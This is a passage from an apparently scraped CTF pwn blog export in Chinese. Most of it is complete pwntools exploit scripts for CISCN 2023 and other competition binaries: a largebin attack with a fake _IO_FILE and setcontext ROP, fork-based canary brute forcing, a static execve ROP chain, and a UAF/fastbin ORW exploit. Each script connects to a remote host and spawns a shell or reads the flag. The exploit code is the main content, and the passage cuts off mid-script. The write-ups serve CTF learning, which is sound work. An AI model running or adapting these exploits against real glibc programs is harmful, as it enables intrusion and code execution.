_IO_default_imbue),&#125;; 在这么多函数中 存在部分函数 其参数和调用指针均可被file结构体控制 所以就相当于一次任意指针调用 供我们控制程序执行流 以write举例 _IO_cookie_write (FILE *fp, const void *buf, ssize_t size)&#123; struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp; cookie_write_function_t *write_cb = cfile-&gt;__io_functions.write;#ifdef PTR_DEMANGLE PTR_DEMANGLE (write_cb);#endif if (write_cb == NULL) &#123; fp-&gt;_flags |= _IO_ERR_SEEN; return 0; &#125; ssize_t n = write_cb (cfile-&gt;__cookie, buf, size); if (n &lt; size) fp-&gt;_flags |= _IO_ERR_SEEN; return n;&#125; 可以看到调用write的指针和参数 都是由file结构体提供的 同时这里还要注意一下这个选项 #ifdef PTR_DEMANGLE PTR_DEMANGLE (write_cb);#endif 其主要的作用就是起到加密指针 将原本的指针ror后 再和fs寄存器0x30偏移处的值进行异或 由于对应的值我们没有办法泄露出来 所以可以通过两次largebinattack覆盖其为我们已知的值 而两次largebinattack需要比较多的辅助chunk 我们肯定是想着能用到较少的chunk更好 所以就存在了第一次largebinattack完以后 我们需要重新回收chunk 将其从bin中重新申请出来 就需要恢复两个largebin chunk的四个域 利用模板add(0x420)#0add(0x10)#1add(0x410)#2add(0x10)#3delete(0)add(0x500)#4delete(2)show(0)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1ebfd0success(&quot;libc_addr :&quot;+hex(libc_addr))delete(1)delete(3)show(3)io.recv()heap_addr = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x6d0success(&quot;heap_addr :&quot;+hex(heap_addr))stderr_addr = libc_addr + libc.sym[&#x27;stderr&#x27;]payload = p64(0)*3 + p64(stderr_addr-0x20)edit(0,len(payload),payload)add(0x500)#5former_libc = libc_addr + 0x1ebfd0chunk0_addr = heap_addr +0x290chunk2_addr = heap_addr +0x6e0payload = p64(former_libc)+p64(chunk0_addr)*3edit(2,len(payload),payload)payload = p64(chunk2_addr)+p64(former_libc)+p64(chunk2_addr)*2edit(0,len(payload),payload)add(0x420)#6add(0x410)#7delete(6)add(0x500)#8delete(7)TLS_addr = libc_addr+0x1f3580success(hex(TLS_addr))payload = p64(0)*3+p64(TLS_addr+0x30-0x20)edit(6,len(payload),payload)add(0x500)#9payload = p64(former_libc)+p64(chunk0_addr)*3#+cyclic(0x58)+p64(heap_addr)edit(2,len(payload),payload)payload = p64(chunk2_addr)+p64(former_libc)+p64(chunk2_addr)*2edit(0,len(payload),payload)payload = cyclic(0x508)+p64(0x100)edit(9,len(payload),payload)next_chain = 0srop_addr = heap_addr + 0x7c0gadget_addr = libc_addr + 0x00000000001547a0setcontext_addr = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61rdi_addr = libc_addr + next(libc.search(asm(&quot;pop rdi;ret&quot;)))binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]ret_addr = libc_addr + 0x0000000000025679fake_IO_FILE = 2 * p64(0)fake_IO_FILE += p64(0) # _IO_write_base = 0fake_IO_FILE += p64(0) # _IO_write_ptr = 0fake_IO_FILE += p64(0)fake_IO_FILE += p64(0) # _IO_buf_basefake_IO_FILE += p64(0) # _IO_buf_endfake_IO_FILE = fake_IO_FILE.ljust(0x58, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(next_chain) # _chainfake_IO_FILE = fake_IO_FILE.ljust(0x78, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(heap_addr) # _lock = writable addressfake_IO_FILE = fake_IO_FILE.ljust(0xB0, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(0) # _mode = 0fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(libc_addr + 0x1eca20 + 0x40) # vtablefake_IO_FILE += p64(srop_addr) # rdifake_IO_FILE += p64(srop_addr)fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_addr + 0x6e0), 0x11))fake_IO_FILE += p64(0)+p64(setcontext_addr)fake_IO_FILE += cyclic(0x78)+p64(heap_addr+0x868)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)edit(2,len(fake_IO_FILE),fake_IO_FILE)# gdb.attach(io,&#x27;b *($rebase(0x1422))&#x27;)# pause(0)add(0x1000)# pause()io.interactive() 部分地方根据自己复现的二进制文件不同修改 自己动调一遍其实就懂了 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"Protobuf协议","slug":"Protobuf协议","date":"2023-05-31T05:19:39.000Z","updated":"2023-09-14T17:20:20.000Z","comments":true,"path":"2023/05/31/Protobuf协议/","link":"","permalink":"http://example.com/2023/05/31/Protobuf%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"前言一种数据传输协议 2023年的国赛初赛考了一题基于这个堆题 需要使用其才能完成菜单交互 其中几个用来pack和unpack的函数代码审计起来很恶心 如果不知道这个协议的 看到以后会无从下手 挺恶心人的 刚好我有出题的需要 就记录一下相关的 环境配置首先需要安装protoc 便于以后我们利用protoc文件生成py文件 sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-clientsudo apt-get install autoconf automake libtoolsudo apt-get install autoconf automake libtool curl make g++ unzip git clone https://gitclone.com/github.com/protocolbuffers/protobuf.git cd protobuf./autogen.sh./configuremakesudo make installsudo ldconfig 如果有出题需求的话 还需要安装protobuf-c 才能编译 git clone https://gitclone.com/github.com/protobuf-c/protobuf-c.gitcd protobuf-c/./autogen.sh &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make install 编译先从利用proto文件生成c语言编译所需要的pb-c.h文件说起 诸如这样写好一个proto文件后 syntax = &quot;proto2&quot;;package test;message Student &#123; optional string name = 1; //这个1无特殊含义 是表示顺序 如果还需要新增一个变量就=2&#125;optional和request是代表是否强制要求该数据 数据类型这个参照其他教程 我复制粘贴供哪天我本地查询 protoc-c --c_out=./ ./pwn.proto 使用上面的指令会生成两个文件 一个是在gcc编译时需要使用 一个是在源码编写中需要作为头文件导入 同时需要注意 proto文件中变量名不区分大小写 这个时候差不多就可以编写c语言源码了 直接上一个demo #include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include &quot;pwn.pb-c.h&quot;size_t my_pack(char *out)&#123; Test__Student a; test__student__init(&amp;a); a.name = &quot;hello&quot;; return test__student__pack(&amp;a,out);&#125;void my_unpack(size_t len,const uint8_t *data)&#123; Test__Student *tmp = test__student__unpack(NULL,len,data); test__student__free_unpacked(tmp, NULL);&#125;int main()&#123; char buf[0x20]; unsigned int len = my_pack(buf); Test__Student *tmp = test__student__unpack(NULL,len,buf); printf(&quot;%s\\n&quot;,tmp-&gt;name);&#125; 一个完整的流程是 初始化包 将其值打包 最后解包得到参数 最后还可以销毁包 这里的buf不一定要栈上 也可以malloc一块空间 总体应该还是很好理解的 这个时候我们就可以尝试编译了 还需要带上刚才生成的pb-c文件 gcc pwn.pb-c.c test.c -o pwn -lprotobuf-c 此时 直接运行会出现如下的报错 sudo ldconfig 该指令可以搜寻共享动态库 创建出动态装入程序所需的连接和缓存文件 可以看到成功输出hello 剩下的就没什么好说了 如果要想恶心一点就删符号表 静态编译 代码审计量巨大 解题拿今年CISCN初赛的一题来举例 我也是通过这题了解到protobuf 抛开交互这道题是一个堆 我估计他的源码是用malloc开空间 所以在后面堆的时候 堆结构会改变 就很烦 这里就不提了 可以去看我的wp void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; ssize_t v3; // rsi __int64 *v4; // [rsp+8h] [rbp-8h] sub_1763(a1, a2, a3); while ( 1 ) &#123; memset(&amp;unk_A060, 0, 0x400uLL); puts(&quot;You can try to have friendly communication with me now: &quot;); v3 = read(0, &amp;unk_A060, 0x400uLL); v4 = sub_192D(0LL, v3, &amp;unk_A060); if ( !v4 ) ((&amp;sub_1328 + 1))(0LL, v3); sub_155D(v4[3], v4[4], v4[5], v4[6], v4[7]); &#125;&#125; 菜单交互题 需要我们利用protobuf来传输数据 第一步就是想办法复原出proto文件 f12查看一下字符串 看看是否有可疑的 看变量名大概可以猜出来 actionid 代表了要操作的函数索引 msgidx是chunk索引 msgsize是malloc的大小 content则是内容 至于Devicemsg则是包名 刚才也说了 不区分大小写的 唯一要注意的是 proto的编写也可以不要包名 但是这个我就没研究过了 感兴趣的自己看吧 syntax = &quot;proto2&quot;;package Devicemsg;message pwn &#123; optional int64 actionid = 1; optional int64 msgidx = 2; optional int64 msgsize = 3; optional bytes msgcontent = 4;&#125; protoc --python_out=./ ./pwn.proto 编写好proto文件后 生成py文件 import导入exp 最后按照如下编写即可 from pwn import*from ctf_pb2 import *from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;123.57.248.214&quot;,16952)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./libc-2.31.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()def add(index,size,content): global io io.recvuntil(&quot;You can try to have friendly communication with me now: &quot;) chunk = pwn() chunk.actionid = 2 chunk.msgidx = index*2 chunk.msgsize = size+0x10 chunk.msgcontent = content io.send(chunk.SerializeToString()) pwn()是根据你proto中的message名称 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"extra","slug":"extra","permalink":"http://example.com/categories/extra/"}],"tags":[]},{"title":"fork爆破canary","slug":"fork爆破canary","date":"2023-05-28T13:47:32.000Z","updated":"2023-09-14T17:19:04.000Z","comments":true,"path":"2023/05/28/fork爆破canary/","link":"","permalink":"http://example.com/2023/05/28/fork%E7%88%86%E7%A0%B4canary/","excerpt":"","text":"前言一种强行泄露出canary的办法 不是很喜欢这类题目 主要是爆破canary的时间比较久 如果后面的脚本有问题 就得重新跑 比较烦人 原理原理主要来关注一下fork函数 fork函数利用系统调用创建了一个子进程 这个子进程的终止与否都不会影响到父进程 系统会给子进程分配代码空间和存储数据 大部分和父进程是一样的 关键的canary也和父进程是一样的 由于子进程的终止不会影响到父进程 所以 如果子进程由于canary不对而触发__stack_chk_fali函数 子进程自己是终止了 但是父进程依然存在 所以可以利用这一点逐个字节爆破canary 如果最后不报错 就说明canary爆破成功 就可以进行栈溢出了 实例Ciscn2023 funcanary 保护机制全开 64位 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; __pid_t v3; // [rsp+Ch] [rbp-4h] sub_1243(a1, a2, a3); while ( 1 ) &#123; v3 = fork(); if ( v3 &lt; 0 ) break; if ( v3 ) &#123; wait(0LL); &#125; else &#123; puts(&quot;welcome&quot;); sub_128A(); puts(&quot;have fun&quot;); &#125; &#125; puts(&quot;fork error&quot;); exit(0);&#125; while嵌套了主要的逻辑 每次都fork出一个子进程 随后进入sub_128A执行操作 跟进一下 unsigned __int64 sub_128A()&#123; char buf[104]; // [rsp+0h] [rbp-70h] BYREF unsigned __int64 v2; // [rsp+68h] [rbp-8h] v2 = __readfsqword(0x28u); read(0, buf, 0x80uLL); return v2 - __readfsqword(0x28u);&#125; 拥有栈溢出的机会 同时还有一个后门函数 int sub_1228()&#123; return system(&quot;/bin/cat flag&quot;);&#125; 那么就是利用fork函数爆破出canary 随后就是栈溢出劫持程序执行流 但是由于开启了pie 所以还得再爆破一位 才能进入后门函数 完整exp: from pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;39.105.26.155&quot;,38646)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;welcome&quot;)canary = b&#x27;\\x00&#x27;for j in range(7): for i in range(0x100): io.send(cyclic(0x68) + canary + i.to_bytes(1,&#x27;little&#x27;)) a = io.recvuntil(&#x27;welcome\\n&#x27;) if b&#x27;have fun&#x27; in a: canary += i.to_bytes(1,&#x27;little&#x27;) breakpayload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x02&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x12&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x22&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x32&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x42&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x52&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x62&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x72&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x82&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x92&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xa2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xb2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xc2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xd2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xe2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xf2&#x27;io.send(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"2023Ciscn初赛","slug":"2023Ciscn","date":"2023-05-28T13:40:56.000Z","updated":"2023-09-14T17:17:30.000Z","comments":true,"path":"2023/05/28/2023Ciscn/","link":"","permalink":"http://example.com/2023/05/28/2023Ciscn/","excerpt":"","text":"收获满满的一次比赛 wp就用赛后提交的吧 涉及到重要的知识点都会开新专栏介绍的 烧烤摊儿在购买物品时 对于数量的判断不严格 存在整数溢出漏洞 输入负数个物品 最后的金额反而会增加 随后直接提供了栈溢出的机会 静态编译的题目 可以直接ROPgadget –binary pwn –ropchain获取一段rop链 getshell from pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;123.56.116.45&quot;,26836)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;/home/test/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;3. 勇闯天涯&quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;来几瓶？&quot;)io.sendline(b&#x27;-20000&#x27;)io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;4&#x27;)io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;5&#x27;)io.recvuntil(&quot;烧烤摊儿已归你所有，请赐名：&quot;)p = b&#x27;a&#x27;*0x28p += pack( 0x000000000040a67e) # pop rsi ; retp += pack( 0x00000000004e60e0) # @ .datap += pack( 0x0000000000458827) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack( 0x000000000045af95) # mov qword ptr [rsi], rax ; retp += pack( 0x000000000040a67e) # pop rsi ; retp += pack( 0x00000000004e60e8) # @ .data + 8p += pack( 0x0000000000447339) # xor rax, rax ; retp += pack( 0x000000000045af95) # mov qword ptr [rsi], rax ; retp += pack( 0x000000000040264f) # pop rdi ; retp += pack( 0x00000000004e60e0) # @ .datap += pack( 0x000000000040a67e) # pop rsi ; retp += pack( 0x00000000004e60e8) # @ .data + 8p += pack( 0x00000000004a404b) # pop rdx ; pop rbx ; retp += pack( 0x00000000004e60e8) # @ .data + 8p += pack( 0x4141414141414141) # paddingp += pack( 0x0000000000447339) # xor rax, rax ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000402404) # syscall# gdb.attach(io,&#x27;b *0x401FAE&#x27;)# pause(0)io.sendline(p)# pause()io.interactive() StrangeTalkBot2.31的一道堆题 但是菜单传参部分是用protobuf来的 先分解出proto文件 protoc -I=./ --python_out=./ ctf.proto 再得到ctf_pb2.py文件 syntax = &quot;proto2&quot;;package Devicemsg;message pwn &#123; optional int64 actionid = 1; optional int64 msgidx = 2; optional int64 msgsize = 3; optional bytes msgcontent = 4;&#125; 最后import导入 就可以菜单交互了 总体的思路就是利用UAF 来double free 不过没有选择tcachebin attack 貌似edit的时候会破坏原本的堆结构 在tcachebin attack的时候一直没法double free 最后放到fastbin里打任意写了 因为开了沙盒 所以最后是用setcontext的办法来构造orw 但是chunk的大小不够放 所以最后是把把orw改成了单次read 动调查看了执行完read的rsp指针 往那个地址读入rop链就行了 from pwn import*from ctf_pb2 import *from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;123.57.248.214&quot;,16952)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./libc-2.31.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()def add(index,size,content): global io io.recvuntil(&quot;You can try to have friendly communication with me now: &quot;) chunk = pwn() chunk.actionid = 2 chunk.msgidx = index*2 chunk.msgsize = size+0x10 chunk.msgcontent = content io.send(chunk.SerializeToString())def edit(index,size,content): global io io.recvuntil(&quot;You can try to have friendly communication with me now: &quot;) chunk = pwn() chunk.actionid = 4 chunk.msgidx = index*2 chunk.msgsize = size+0x10 chunk.msgcontent = content io.send(chunk.SerializeToString())def show(index): global io io.recvuntil(&quot;You can try to have friendly communication with me now: &quot;) chunk = pwn() chunk.actionid = 6 chunk.msgidx = index*2 chunk.msgsize = 0 chunk.msgcontent = b&#x27;&#x27; io.send(chunk.SerializeToString())def delete(index): global io io.recvuntil(&quot;You can try to have friendly communication with me now: &quot;) chunk = pwn() chunk.actionid = 8 chunk.msgidx = index*2 chunk.msgsize = 32 chunk.msgcontent = b&#x27;/bin/sh\\x00&#x27; io.send(chunk.SerializeToString())for i in range(8): add(i,0x100,b&#x27;/bin/sh\\x00&#x27;)for i in range(7): delete(i+1)delete(0)show(0)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1ecbe0success(&quot;libc_addr :&quot;+hex(libc_addr))for i in range(8,17): add(i,0x60,b&#x27;/bin/sh\\x00&#x27;)for i in range(10,17): delete(i)delete(8)delete(9)delete(8)for i in range(17,24): add(i,0x60,b&#x27;&#x27;)free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]show(14)io.recv()heap_addr = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x11c0success(&quot;heap_addr :&quot;+hex(heap_addr))gadget_addr = libc_addr + 0x0000000000151990add(24,0x60,p64(free_hook))add(25,0x60,p64(free_hook))add(26,0x60,p64(free_hook))add(27,0x60,p64(gadget_addr))chunk_addr = heap_addr + 0x1db0-0xc0setcontext_addr = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61rdi_addr = libc_addr + next(libc.search(asm(&quot;pop rdi;ret&quot;)))rsi_addr = libc_addr + next(libc.search(asm(&quot;pop rsi;ret&quot;)))open_addr = libc_addr + libc.sym[&#x27;open&#x27;]rdx_addr = libc_addr + 0x0000000000119211rsp_addr = libc_addr + next(libc.search(asm(&quot;pop rsp;ret&quot;)))read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]ret_addr = libc_addr + 0x0000000000022679flag_addr = chunk_addr+0x10payload = b&#x27;./flag\\x00\\x00&#x27;+p64(chunk_addr+0x10)+cyclic(0x10)+p64(setcontext_addr)payload = payload.ljust(0xa0,b&#x27;\\x00&#x27;) + p64(chunk_addr+0x10+0xa8)+p64(ret_addr)payload += p64(rdi_addr)+p64(0)+p64(rsi_addr)+p64(heap_addr+0x1df0)+p64(rdx_addr)+p64(0x200)+p64(0)+p64(read_addr)#+p64(rsp_addr)+p64(heap_addr+0x1000)add(28,0x1d0,payload)# gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))# pause(0)delete(28)# pause()payload = p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(0) + p64(open_addr)payload += p64(rdi_addr) + p64(3) + p64(rsi_addr) + p64(flag_addr+0x100) + p64(rdx_addr) + p64(0x50) + p64(0) + p64(read_addr)payload += p64(rdi_addr) + p64(1) + p64(rsi_addr) + p64(flag_addr+0x100) + p64(rdx_addr) + p64(0x50) + p64(0) + p64(write_addr)io.send(payload)flag = io.recvuntil(&quot;&#125;&quot;)print(flag) funcanaryfork函数爆破canary 网上有相似的题目 直接用了爆破脚本 小改了一下 最后开了pie 还要再爆破16次 但是不知道为啥是概率通 很迷惑 多爆了了几次才出 from pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;39.105.26.155&quot;,38646)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;welcome&quot;)canary = b&#x27;\\x00&#x27;for j in range(7): for i in range(0x100): io.send(cyclic(0x68) + canary + i.to_bytes(1,&#x27;little&#x27;)) a = io.recvuntil(&#x27;welcome\\n&#x27;) if b&#x27;have fun&#x27; in a: canary += i.to_bytes(1,&#x27;little&#x27;) breakpayload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x02&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x12&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x22&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x32&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x42&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x52&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x62&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x72&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x82&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x92&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xa2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xb2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xc2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xd2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xe2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xf2&#x27;io.send(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"2023闽盾杯复赛","slug":"2023闽盾杯复赛","date":"2023-05-27T01:47:01.000Z","updated":"2023-09-14T17:21:20.000Z","comments":true,"path":"2023/05/27/2023闽盾杯复赛/","link":"","permalink":"http://example.com/2023/05/27/2023%E9%97%BD%E7%9B%BE%E6%9D%AF%E5%A4%8D%E8%B5%9B/","excerpt":"","text":"没有参加复赛 倒是开赛的时候别的师傅给了附件 做了做 最后是一血 一道2.27的堆 原题附件给的跟远程的不一样 坑死了 最后是用2.27 1.6的小版本打通的 代码审计一下 可以得知没有free chunk的机会 但是可以堆溢出覆盖nextchunk的size域 这种情况首先想到了house of orange获得unsortedbin的手法 覆盖一下top chunk 随后我们就泄露出了libc地址 2.23跟2.27的最大差别就是多了tcachebin 在想下一步利用的时候 回想起了以前做过的一道house of force 可以申请到top chunk低地址处的chunk 利用这一点可以覆盖tcachebin结构体的entry指针数组 从而任意写 最后直接往malloc_hook里面写入onegadget就行了 from pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;39.104.26.167&quot;,59599)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;)#libc = ELF(&quot;./libc-2.27.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()def add(index,size): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size))def edit(index,content): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Content: &quot;) io.send(content)def show(index): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def delete(index): io.recvuntil(&quot;Your choice: &quot;) 